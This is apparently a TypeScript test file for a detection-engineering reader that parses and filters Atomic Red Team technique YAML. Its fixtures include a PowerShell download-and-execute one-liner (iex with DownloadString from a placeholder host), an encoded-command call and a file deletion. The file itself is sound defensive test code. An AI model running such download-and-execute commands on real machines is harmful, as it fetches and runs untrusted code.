import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  parseAtomicTechniqueYaml,
  filterAtomicTechniques,
  scanAtomicRedTeam,
} from '../../../dist/security/detection-eng/atomic-red-team-reader.js';

const T1059_001_YAML = `attack_technique: T1059.001
display_name: PowerShell
atomic_tests:
  - name: PowerShell EncodedCommand
    auto_generated_guid: 11111111-1111-1111-1111-111111111111
    description: Runs a base64-encoded PowerShell command.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: powershell.exe -EncodedCommand AAAA
      elevation_required: false
  - name: Invoke-Expression from stdin
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: iex (New-Object Net.WebClient).DownloadString('http://example/script')
`;

const T1070_004_YAML = `attack_technique: T1070.004
display_name: File Deletion
atomic_tests:
  - name: Delete a file on linux
    supported_platforms:
      - linux
      - macos
    executor:
      name: sh
      command: rm /tmp/some-artifact
`;

test('parseAtomicTechniqueYaml extracts technique + tests with executor metadata', () => {
  const tech = parseAtomicTechniqueYaml(T1059_001_YAML, '/tmp/T1059.001.yaml');
  assert.equal(tech.id, 'T1059.001');
  assert.equal(tech.displayName, 'PowerShell');
  assert.equal(tech.tests.length, 2);
  assert.equal(tech.tests[0].name, 'PowerShell EncodedCommand');
  assert.equal(tech.tests[0].executor?.name, 'powershell');
  assert.equal(tech.tests[0].executor?.elevationRequired, false);
  assert.deepEqual(tech.tests[0].platforms, ['windows']);
  assert.deepEqual(tech.errors, []);
});

test('parseAtomicTechniqueYaml returns a deterministic error payload for invalid input', () => {
  const broken = parseAtomicTechniqueYaml(':\n  - [}', '/tmp/broken.yaml');
  assert.equal(broken.id, '');
  assert.ok(broken.errors[0].startsWith('yaml parse error'));
  const missing = parseAtomicTechniqueYaml('atomic_tests: []', '/tmp/missing.yaml');
  assert.ok(missing.errors.includes('missing attack_technique'));
});

test('filterAtomicTechniques narrows by platform, id, and query', () => {
  const powershell = parseAtomicTechniqueYaml(T1059_001_YAML, 'ps.yaml');
  const fileDelete = parseAtomicTechniqueYaml(T1070_004_YAML, 'fd.yaml');
  const windowsOnly = filterAtomicTechniques([powershell, fileDelete], { platforms: ['windows'] });
  assert.equal(windowsOnly.techniques.length, 1);
  assert.equal(windowsOnly.techniques[0].id, 'T1059.001');

  const byId = filterAtomicTechniques([powershell, fileDelete], { techniqueIds: ['T1070.004'] });
  assert.equal(byId.techniques.length, 1);
  assert.equal(byId.techniques[0].id, 'T1070.004');

  const byQuery = filterAtomicTechniques([powershell, fileDelete], { query: 'encodedcommand' });
  assert.equal(byQuery.total, 1);
  assert.equal(byQuery.techniques[0].tests[0].name, 'PowerShell EncodedCommand');

  const platformCounts = filterAtomicTechniques([powershell, fileDelete], {});
  assert.equal(platformCounts.byPlatform.windows, 2);
  assert.equal(platformCounts.byPlatform.linux, 1);
});

test('scanAtomicRedTeam uses injected walk + read for offline testing', async () => {
  const readFileImpl = async (path: string): Promise<string> => {
    if (path.endsWith('T1059.001.yaml')) return T1059_001_YAML;
    if (path.endsWith('T1070.004.yaml')) return T1070_004_YAML;
    throw new Error(`unexpected path ${path}`);
  };
  const walkImpl = async () => ['/fake/atomics/T1059.001/T1059.001.yaml', '/fake/atomics/T1070.004/T1070.004.yaml'];
  const summary = await scanAtomicRedTeam({
    rootPath: '/fake',
    readFileImpl,
    walkImpl,
    platforms: ['linux'],
  });
  assert.equal(summary.techniques.length, 1);
  assert.equal(summary.techniques[0].id, 'T1070.004');
});

test('scanAtomicRedTeam soft-fails when the walk throws', async () => {
  const walkImpl = async () => {
    throw new Error('ENOENT: no such directory');
  };
  const summary = await scanAtomicRedTeam({ rootPath: '/missing', walkImpl });
  assert.equal(summary.techniques.length, 0);
  assert.ok(summary.errors[0].includes('scan failed'));
});
